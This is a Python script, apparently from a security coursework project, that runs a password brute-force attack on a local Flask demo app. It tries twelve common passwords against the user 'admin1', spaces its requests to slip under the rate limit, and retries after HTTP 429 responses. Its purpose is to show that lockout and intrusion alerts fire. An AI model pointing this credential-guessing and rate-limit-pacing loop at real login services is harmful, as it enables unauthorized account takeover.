"""
Local-only brute-force demonstration for the coursework Flask app.

This script is intentionally limited to:
- the demo application on http://127.0.0.1:5000
- a short hardcoded password list
- a single demo username

On the `master` branch (no defences) the attack completes in seconds.
On the `secure` branch the script respects the rate limit (3 req/min) and
sends enough attempts to trigger:
  - Rate limiting (HTTP 429)
  - Account lockout after 10 consecutive failures (HTTP 403)
  - HIGH-severity brute_force_mitigation IDS alert
"""

import sys
import time

import requests


LOGIN_URL = "http://127.0.0.1:5000/login?format=json"
TARGET_USERNAME = "admin1"

# 12 wrong passwords — enough to exceed the 10-attempt lockout threshold
# and trigger the HIGH-severity brute_force_mitigation IDS alert.
PASSWORD_CANDIDATES = [
    "123456",
    "password",
    "admin123",
    "letmein",
    "admin",
    "qwerty",
    "iloveyou",
    "monkey",
    "dragon",
    "master",
    "trustno1",
    "welcome",
]

# The secure branch enforces 3 requests per minute on /login.
# Wait 21 seconds between attempts to stay just under the limit.
RATE_LIMIT_DELAY = 21


def main():
    print("=" * 60)
    print("Brute-Force Attack Demo")
    print("=" * 60)
    print(f"Target:   {LOGIN_URL}")
    print(f"Username: {TARGET_USERNAME}")
    print(f"Attempts: {len(PASSWORD_CANDIDATES)}")
    print(f"Delay:    {RATE_LIMIT_DELAY}s between attempts (rate-limit aware)")
    print("-" * 60)

    for attempt_number, candidate in enumerate(PASSWORD_CANDIDATES, start=1):
        payload = {
            "username": TARGET_USERNAME,
            "password": candidate,
        }

        print(f"\n[Attempt {attempt_number}/{len(PASSWORD_CANDIDATES)}] "
              f"Trying password: {candidate!r}")

        try:
            response = requests.post(LOGIN_URL, json=payload, timeout=10)
        except requests.RequestException as exc:
            print(f"  Request failed: {exc}")
            print("  Make sure the Flask app is running on http://127.0.0.1:5000.")
            sys.exit(1)

        print(f"  HTTP {response.status_code}", end="")

        # Handle rate limiting (429)
        if response.status_code == 429:
            print(" — RATE LIMITED (defence working)")
            print(f"  Waiting {RATE_LIMIT_DELAY}s before retry...")
            time.sleep(RATE_LIMIT_DELAY)
            # Retry the same password after waiting
            try:
                response = requests.post(LOGIN_URL, json=payload, timeout=10)
            except requests.RequestException as exc:
                print(f"  Retry failed: {exc}")
                sys.exit(1)
            print(f"  Retry → HTTP {response.status_code}", end="")

        try:
            data = response.json()
        except ValueError:
            data = {}

        # Account locked (403)
        if response.status_code == 403:
            print(" — ACCOUNT LOCKED (brute-force mitigation triggered)")
            print("\n" + "=" * 60)
            print("Result: account lockout defence activated.")
            print("A HIGH-severity IDS alert has been raised.")
            print("Log in as admin to view it on the Security Alerts dashboard.")
            print("=" * 60)
            return

        # Successful login
        if response.status_code == 200 and data.get("success"):
            print(" — LOGIN SUCCEEDED")
            print(f"\n  Password found: {candidate!r}")
            print("  Result: brute-force attack succeeded (no defence).")
            return

        # Failed login (401)
        print(f" — {data.get('message', 'Login failed')}")

        # Delay to respect rate limit before next attempt
        if attempt_number < len(PASSWORD_CANDIDATES):
            print(f"  Waiting {RATE_LIMIT_DELAY}s (rate-limit aware)...")
            time.sleep(RATE_LIMIT_DELAY)

    print("\n" + "=" * 60)
    print("Result: all passwords exhausted, no match found.")
    print("=" * 60)
    sys.exit(1)


if __name__ == "__main__":
    main()
